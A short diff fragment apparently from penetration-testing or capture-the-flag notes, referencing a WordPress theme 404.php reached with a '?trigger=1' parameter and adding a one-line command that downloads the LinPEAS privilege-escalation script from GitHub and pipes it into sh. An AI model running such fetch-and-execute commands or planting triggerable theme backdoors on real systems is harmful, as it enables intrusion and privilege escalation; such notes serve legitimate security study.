@@ -59,3 +59,9 @@ if (isset($_GET['trigger'])) {
 Example: http://[IP]/wordpress/wp-content/themes/[THEME]/404.php?trigger=1)
 ```
 
+LinPEAS
+```
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+```
+
+
